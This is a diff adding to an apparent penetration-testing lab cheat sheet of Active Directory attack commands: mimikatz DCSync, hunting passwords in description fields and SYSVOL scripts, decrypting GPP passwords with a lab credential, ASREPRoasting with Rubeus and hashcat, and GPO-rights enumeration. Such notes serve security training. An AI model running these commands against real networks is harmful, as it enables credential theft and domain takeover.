@@ -74,3 +74,26 @@
     1. `.\mimikatz.exe`
     2. `privilege::debug`
     3. `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`
+    ### **Password in Description Field**
+    1. Finding Passwords in the Description Field using Get-Domain User: `Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}`
+    2. Checking for PASSWD_NOTREQD Setting using Get-DomainUser: `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`
+    3. Credentials in SMB Shares and SYSVOL Scripts: 
+        1. Discovering an Interesting Script: `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
+        2. Finding a Password in the Script: `cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs`
+    4. Group Policy Preferences (GPP) Passwords:
+        1. Locating & Retrieving GPP Passwords with CrackMapExec: `crackmapexec smb -L | grep gpp`
+        2. Using CrackMapExec's gpp_autologin Module: `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`
+        3. Decrypting the Password with gpp-decrypt: `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`
+## **ASREPRoasting**
+1. Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser: `Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`
+2. Retrieving AS-REP in Proper Format using Rubeus: `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`
+3. Cracking the Hash Offline with Hashcat: `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt `
+4. Retrieving the AS-REP Using Kerbrute: `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
+5. Hunting for Users with Kerberoast Pre-auth Not Required: `GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users`
+## **Group Policy Object (GPO) Abuse**
+1. Enumerating GPO Names with PowerView: `Get-DomainGPO |select displayname`
+2. Enumerating GPO Names with a Built-In Cmdlet: `Get-GPO -All | Select DisplayName`
+3. Enumerating Domain User GPO Rights:
+    1. `$sid=Convert-NameToSid "Domain Users"`
+    2. `Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}`
+4. Converting GPO GUID to Name: `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`
